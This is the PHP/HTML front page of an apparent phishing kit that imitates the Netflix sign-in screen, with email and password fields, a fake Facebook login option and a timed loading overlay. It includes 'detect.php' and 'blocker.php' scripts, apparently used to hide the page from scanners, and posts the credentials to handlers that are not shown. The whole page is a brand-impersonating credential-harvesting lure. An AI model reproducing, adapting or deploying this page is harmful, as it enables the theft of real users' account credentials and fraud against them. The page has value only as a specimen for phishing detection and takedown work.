<?php
    include("./system/system.php");
    include("./system/detect.php");
    include("./system/blocker.php");


?>

<html><head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" content="">

<title>Netflix</title>


<link type="text/css" rel="stylesheet" href="./style/css/stylef.css"/>










<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/style.js"></script>
<script src="./style/js/Baby.js" > </script>




<link type="text/css" rel="stylesheet" href="./style/css/nonechaditk.css"/>



<meta content="" name="description">
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">



<link rel="shortcut icon" href="./style/css/nficon2016.ico">
<link rel="apple-touch-icon" href="./style/css/nficon2016.png">




<meta property="og:description" content="">
<meta property="al:ios:url" content="">
<meta property="al:ios:app_store_id" content="">
<meta property="al:ios:app_name" content="Netflix">
<meta property="al:android:url" content="">
<meta property="al:android:package">
<meta property="al:android:app_name" content="Netflix">
<meta name="twitter:card" content="player">
<meta name="twitter:site" content="@netflix">


</head>
<body>


<div id="spuenndr" style="display:none;background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.7;filter: alpha(opacity=50);" >
<span style="font-size: 247.6px;margin-left: -124.8px;margin-top: -124.8px;left: 50%;font-size: 28.8vw;margin-left: -14.4vw;margin-top: -14.4vw;"></span><div class="waitIndicator"><div class="basic-spinner center-absolute" style="width: 115px; height: 115px;"></div></div></div>





<div id="fixed" style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.7;filter: alpha(opacity=50);" ><span style="font-size: 247.6px;margin-left: -124.8px;margin-top: -124.8px;left: 50%;font-size: 28.8vw;margin-left: -14.4vw;margin-top: -14.4vw;"></span><div class="waitIndicator"><div class="basic-spinner basic-spinner-light center-absolute" style="width: 115px; height: 115px;"></div></div></div>


<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>





<div id="appMountPoint">

<div class="login-wrapper hybrid-login-wrapper" data-reactroot="">

<div class="login-wrapper-background"><img class="concord-img vlv-creative" src="./style/css/alpha_website_small.jpg"  alt="">


</div>

<br>


<div class="nfHeader login-header signupBasicHeader"><a href="#" class="svg-nfLogo signupBasicHeader"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">

<g id="netflix-logo"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div><div class="login-body"><div><noscript><div class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div class="ui-message-contents">Looks like you have disabled JavaScript. Please enable JavaScript to restore full page functionality.</div></div></noscript>

<div class="login-content login-form hybrid-login-form hybrid-login-form-signup"><div class="hybrid-login-form-main"><h1>Sign In</h1>






<form id="loginnet" name="loginnet" method="post" class="login-form" action="">


<div id="errorrloginnet">
</div>




<div  class="dddd nfInput nfEmailPhoneInput login-input login-input-email">


<div class="nfInputPlacement"><div class="nfEmailPhoneControls">

<label class="input_id">



<input required="required" type="text" name="iduserLoginId" class="nfTextField" id="iduserLoginId" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="iduserLoginIdinputError">


<span for="id_userLoginId" class="placeLabel">Email or phone number</span></label>



<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link">
</a>

</div>
</div>
</div>
<div id="" class="inputError"><span id="iduserLoginIdinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>

<div class="dddd nfInput nfPasswordInput nfPasswordHasToggle  login-input login-input-password">

<span id="idpasswordinputError" class="error" style="display: none;"></span>



<div class="nfInputPlacement"><div class="nfPasswordControls nfEmailPhoneControls">

<label class="input_id">


<input minlength="4" required="required" type="password" name="idpassword" class="nfTextField" id="idpassword" aria-describedby="idpasswordinputError" aria-invalid="false">


<span for="id_password" class="placeLabel">Password</span>
</label>

<button style="" id="passwordSHOW" type="button" class="nfPasswordToggle" title="Show Password">SHOW</button>

<button style="display:none;" id="passwordHIDE" type="button" class="nfPasswordToggle" title="HIDE Password">HIDE</button>


</div>
</div>
<div id="" class="inputError">
<span id="idpasswordinputError" class="nfEmailPhoneInError" style="display: none;"></span>
</div>
</div>


<button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">Sign In</button>


<div class="hybrid-login-form-help">
<div class="ui-binary-input login-remember-me">
<input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="0" checked="">

<label for="bxid_rememberMe_true"><span class="login-remember-me-label-text">Remember me</span></label><div class="helper"></div></div><a href="#" class="login-help-link">Need help?</a></div><input type="hidden" name="flow" value="websiteSignUp"><input type="hidden" name="mode" value="login"><input type="hidden" name="action" value="loginAction"><input type="hidden" name="withFields" value="rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode"><input type="hidden" name="authURL" value=""><input type="hidden" name="nextPage" value=""><input type="hidden" name="showPassword" value=""><input type="hidden" name="countryCode" value=""><input type="hidden" name="countryIsoCode" value=""></form>


</div><div class="hybrid-login-form-other"><form method="post" class="login-form" action=""><div class="facebookForm regOption"><div class="fb-minimal"><hr><button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off" tabindex="0"><div class="fb-login"><img class="icon-facebook" src="./style/css/FB-f-Logo__blue_57.png"><span class="fbBtnText">Login with Facebook</span></div></button></div></div><input type="hidden" name="flow" value="websiteSignUp"><input type="hidden" name="mode" value="login"><input type="hidden" name="action" value="facebookLoginAction"><input type="hidden" name="withFields" value="accessToken,rememberMe,nextPage"><input type="hidden" name="authURL" value=""><input type="hidden" name="nextPage" value=""><input type="hidden" name="showPassword" value=""><input type="hidden" name="countryCode" value="+212"><input type="hidden" name="countryIsoCode" value="MA"><input type="hidden" name="accessToken" value=""></form><div class="login-signup-now">New to Netflix? <a class="" target="_self" href="#">Sign up now</a>.</div></div></div></div></div>


<div class="site-footer-wrapper login-footer"><div class="footer-divider"></div><div class="site-footer"><p class="footer-top"><a class="footer-top-a" href="#">Questions? Contact us.</a></p><ul class="footer-links structural"><li class="footer-link-item" placeholder="footer_responsive_link_gift_card_terms_item"><a class="footer-link" href="#" placeholder="footer_responsive_link_gift_card_terms"><span id="">Gift Card Terms</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" href="#"><span id="">Terms of Use</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_privacy_item"><a class="footer-link" href="#" placeholder="footer_responsive_link_privacy"><span id="">Privacy Statement</span></a></li></ul><div class="lang-selection-container" id="lang-switcher"><div class="ui-select-wrapper"><label class="ui-label no-display"><span class="ui-label-text"></span></label><div class="select-arrow medium prefix globe"><select class="ui-select medium" tabindex="0" placeholder="lang-switcher">

<option selected="" value="#" data-language="en" data-country="us">English</option>

</select></div></div></div></div></div>

</div></div><div>

<div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div>


</div><div></div></div></div></body></html>